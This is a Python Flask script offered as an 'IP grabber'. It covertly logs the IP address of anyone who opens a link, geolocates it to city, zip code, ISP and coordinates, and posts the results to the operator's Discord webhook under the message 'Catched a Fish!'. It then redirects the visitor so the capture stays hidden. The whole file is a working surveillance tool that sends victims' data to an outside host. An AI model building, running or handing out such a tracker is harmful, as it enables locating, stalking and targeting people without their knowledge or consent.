from flask import Flask, request, redirect
from datetime import date, datetime
import requests

# This IP grabber uses a Flask web server to capture the IP address of anyone who visits the root URL ("/").
# When a visitor accesses the page, their IP address is extracted from the request, and a webhook is sent 
# to a specified Discord channel with the IP information and the date it was captured.
# The webhook includes an embed with details about the:
# IP address, such as country, region, city, zip code, ISP, latitude, longitude, and timezone.

app = Flask(__name__)
def send_ip(ip, date):

    webhook_url = "YOUR WEBHOOK HERE"
    data = {
        "content": f"""
        # Catched a Fish!\nInformation received, you can check the details below:
        """
        #"username": "Gate",
        #"avatar_url": "https://cdn.discordapp.com/attachments/144696879161"
    }
    req = requests.get(f"http://ip-api.com/json/{ip}")
    data_i = req.json()
    data["embeds"] = [
        {
            "title": "IP Information\n\n",
            "fields": [
                {
                    "name": "",
                    "value": f"IP Address: {ip}"
                },
                {
                    "name": "",
                    "value": f"Date: {date}",
                },
                {
                    "name": "Stats:",
                    "value": f"Country: {data_i['country']}\nRegion: {data_i['regionName']}\nCity: {data_i['city']}\nZip: {data_i['zip']}\nISP: {data_i['isp']}\nLatitude: {data_i['lat']}\nLongitude: {data_i['lon']}\nTimezone: {data_i['timezone']}"
                }
            ]
        }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    data_i = requests.get(f"http://ip-api.com/json/{ip}").json()

    send_ip(ip, date)
    # For debugging, kept them for now, but you can remove them if you want, they were only used for testing purposes
    #print(f"Received IP: {ip} at {date}")
    #print(data_i)

    # Redirect to any website you want after grabbing the IP.
    return redirect("")

if __name__ == "__main__":
    app.run(host='0.0.0.0')